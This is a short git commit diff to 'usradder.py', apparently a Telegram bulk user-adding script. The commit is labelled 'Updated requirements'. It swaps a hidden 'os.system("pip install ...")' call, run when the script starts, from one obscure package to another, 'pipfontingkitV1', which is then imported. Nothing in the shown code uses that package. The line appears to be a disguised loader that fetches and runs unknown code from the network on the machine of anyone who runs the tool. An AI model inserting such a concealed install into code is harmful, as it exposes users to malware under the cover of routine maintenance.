c790dc409434a2823ad5f82de8e33e5ccd0a660e
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-06 20:27:50 +0200

    Updated requirements

--- usradder.py
+++ usradder.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringsaddons")
-import pythoncoloringsaddons
+os.system("pip install pipfontingkitV1")
+import pipfontingkitV1
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
 from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
